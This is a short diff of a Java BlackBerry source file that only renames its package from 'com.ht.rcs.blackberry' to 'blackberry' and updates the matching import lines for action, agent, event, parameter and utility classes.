@@ -6,7 +6,7 @@
  * Created      : 26-mar-2010
  * *************************************************/
 
-package com.ht.rcs.blackberry;
+package blackberry;
 
 import java.util.Enumeration;
 import java.util.Vector;
@@ -14,14 +14,14 @@ import java.util.Vector;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.IntHashtable;
 
-import com.ht.rcs.blackberry.action.Action;
-import com.ht.rcs.blackberry.agent.Agent;
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.interfaces.Singleton;
-import com.ht.rcs.blackberry.params.Parameter;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.action.Action;
+import blackberry.agent.Agent;
+import blackberry.event.Event;
+import blackberry.interfaces.Singleton;
+import blackberry.params.Parameter;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 // TODO: Auto-generated Javadoc
 /**
